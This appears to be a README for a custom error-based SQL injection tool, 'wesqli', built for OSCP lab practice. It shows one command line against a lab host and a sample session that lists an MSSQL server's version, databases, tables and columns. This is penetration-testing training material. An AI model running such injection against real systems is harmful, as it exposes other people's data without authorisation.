#### Use case

    This module is for error based SQL injection.
    SQLmap is a better andmore robust alternative, however,
    we are not allowed to use automation tools on the OSCP.
    Therefore, I created this custom module for my own usage.

#### Sample module wesqli
    wesqli -rh 10.11.1.229 -if burp.txt -t "1'" -sr -hp 127.0.0.1:8080 -o "DESC"
    Options:

    1: List server name
    2: List version
    3: List current database name
    4: List all databases
    5: List tables from database
    6: List columns from a table
    7: List row values for a column
    Type 'exit' to exit


    Select an option (numerical value): 1
    Server name: MAIL\SQLEXPRESS
    Options:

    1: List server name
    2: List version
    3: List current database name
    4: List all databases
    5: List tables from database
    6: List columns from a table
    7: List row values for a column
    Type 'exit' to exit


    Select an option (numerical value): 2
    Database version: Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) <br>    Aug 22 2017 17:04:49 <br>       Copyright (C) 2017 Microsoft Corporation<br>        Express Edition (64-bit) on Windows Server 2016 Standard 10.0 &lt;X64&gt; (Build 14393: ) (Hypervisor)<br>
    Options:

    1: List server name
    2: List version
    3: List current database name
    4: List all databases
    5: List tables from database
    6: List columns from a table
    7: List row values for a column
    Type 'exit' to exit


    Select an option (numerical value): 3
    Current database name: newsletter
    Options:

    1: List server name
    2: List version
    3: List current database name
    4: List all databases
    5: List tables from database
    6: List columns from a table
    7: List row values for a column
    Type 'exit' to exit


    Select an option (numerical value): 4
    Databases:
    tempdb
    newsletter
    msdb
    model
    master
    archive

    Options:

    1: List server name
    2: List version
    3: List current database name
    4: List all databases
    5: List tables from database
    6: List columns from a table
    7: List row values for a column
    Type 'exit' to exit


    Select an option (numerical value): 5
    Enter a database name: newsletter
    Tables in newsletter:
    users

    Options:

    1: List server name
    2: List version
    3: List current database name
    4: List all databases
    5: List tables from database
    6: List columns from a table
    7: List row values for a column
    Type 'exit' to exit


    Select an option (numerical value): 6
    Enter a database name: newsletter
    Enter a table name: users
    Columns in newsletter.users:
    username
    user_id
    email
